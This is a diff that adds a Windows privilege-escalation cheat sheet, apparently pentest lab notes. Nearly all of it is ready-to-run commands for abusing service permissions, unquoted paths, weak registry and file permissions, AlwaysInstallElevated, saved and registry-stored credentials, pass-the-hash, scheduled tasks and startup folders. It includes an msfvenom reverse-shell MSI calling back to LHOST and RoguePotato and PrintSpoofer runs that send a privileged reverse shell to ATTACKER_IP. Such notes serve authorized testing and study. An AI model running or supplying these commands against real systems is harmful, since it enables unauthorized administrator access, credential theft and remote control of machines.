@@ -1,0 +1,99 @@
+- Insecure service permission :
+    - Check permission of a service : 
+        - command : C:\PATH_TO\accesschk.exe /accepteula -uwcqv USER SERVICE
+        - value to check : SERVICE_CHANGE_CONFIG
+    - Query service : 
+        - command : sc qc SERVICE
+        - value to check : BINARY_PATH_NAME, SERVICE_START_NAME
+    - Set binary path of the service : sc config SERVICE binpath= "\"C:\PATH_TO\exploit.exe\""
+    - Restart the service : 
+        - stop : net stop SERVICE
+        - start : net start SERVICE
+    
+- Unquoted service path : 
+    - query service :
+        - command : sc qc SERVICE
+        - value to check : BINARY_PATH_NAME, SERVICE_START_NAME
+    - check privilege of directories within the path : C:\PATH_TO\accesschk.exe /accepteula -uwdq "C:\PATH_TO\SERVICE\"
+    - copy exploit to writable path in the path to the service : copy C:\PATH_TO\exploit.exe "C:\PATH_TO\DIRECTORY_NAME"
+    - Restart the service : 
+        - stop : net stop daclsvc
+        - start : net start daclsvc
+
+- weak registry permission :
+    - query service : sc qc SERVICE
+    - check the registry of the service : C:\PATH_TO\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICE
+    - edit the image path of the service : reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICE /v ImagePath /t REG_EXPAND_SZ /d C:\PATH_TO\exploit.exe /f
+    - Restart the service : 
+        - stop : net stop daclsvc
+        - start : net start daclsvc
+
+- Weak service executable :
+    - query service : sc qc SERVICE
+    - check executable permission : C:\PATH_TO\accesschk.exe /accepteula -quvw "C:\PATH_TO\EXECUTABLE"
+    - Overwrite the executable : copy C:\PATH_TO\exploit.exe "C:\PATH_TO\EXECUTABLE" /Y
+    - Restart the service : 
+        - stop : net stop daclsvc
+        - start : net start daclsvc
+    
+- Weak autorun permission :
+    - check registry of autorun : reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    - check permission of autorun executable : C:\PATH_TO\accesschk.exe /accepteula -wvu "C:\PATH_TO\EXECUTABLE"
+    - Overwrite the executable : copy C:\PATH_TO\exploit.exe "C:\PATH_TO\EXECUTABLE" /Y
+    - Restart the computer
+    - wait for the administrator to log in
+
+- registry AlwaysInstallElevated :
+    - Query the registry for AlwaysInstallElevated keys :
+        - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    - generate a msi payload on kali : 
+        - metasploit reverse shell : msfvenom -p windows/x64/shell_reverse_tcp LHOST=LOCAL LPORT=53 -f msi -o exploit.msi
+    - transfer the payload to the target 
+    - run the payload : msiexec /quiet /qn /i C:\PATH_TO\exploit.msi
+
+- password registry :
+    - search "password" in registry : reg query HKLM /f password /t REG_SZ /s
+    - search admin autologon credentials (example usecase) : reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+    - use winexe to spawn cmd shell : winexe -U 'USER%PASSWORD' //TARGET_IP cmd.exe
+
+- password saved creds : 
+    - list all saved creds in the cmd : cmdkey /list
+    - run command with saved creds : runas /savecred /user:admin C:\PATH_TO\exploit.exe
+
+- password with sam :
+    - 
+
+- pass the hash : 
+    - with pth-winexe : pth-winexe -U 'USER%HASH(LM + NTLM)' //TARGET_IP cmd.exe
+
+- scheduled task : 
+    - show content of a file : type C:\PATH_TO\executable
+    - check write permission to the file : C:\PATH_TO\accesschk.exe /accepteula -quvw USER C:\PATH_TO\executable
+    - append some content to the file : echo C:\PATH_TO\exploit.exe >> C:\PATH_TO\executable
+
+- insecure gui :
+    - connect to rdp : rdesktop -u USER -p PASSWORD MACHINE_IP
+    - tasklist /V | findstr EXECUTABLE
+    - Launch the application : click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
+
+- insecure startup directories :
+    - check the directory permissions : C:\PATH_TO\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+    - create a shortcut to the exploit in the startup directory : cscript C:\PATH_TO\CreateShortcut.vbs
+    - Restart the machine or connect to rdp : rdesktop -u USER TARGET_IP
+
+- token impersonation - rogue potato: 
+    - requirements : SeImpersonate and SeAssingPrimaryToken
+    - portforwarding : sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
+    - simulate admin starting service : C:\PATH_TO\PSExec64.exe -i -u "nt authority\local service" C:\PATH_TO\exploit.exe
+    - start a rogue potato to run and trigger a privileged reverse shell in the shell : C:\PATH_TO\RoguePotato.exe -r ATTACKER_IP -e "C:\PATH_TO\reverse.exe" -l 9999
+
+- token impersonation - print spoofer :
+    - simulate admin starting service : C:\PATH_TO\PSExec64.exe -i -u "nt authority\local service" C:\PATH_TO\exploit.exe
+    - in the shell, run printspoofer to triger a privileged reverse shell : C:\PATH_TO\PrintSpoofer.exe -c "C:\PATH_TO\reverse.exe" -i
+
+- Automated scripts : 
+    winPEASany.exe
+    Seatbelt.exe
+    PowerUp.ps1
+    SharpUp.exe
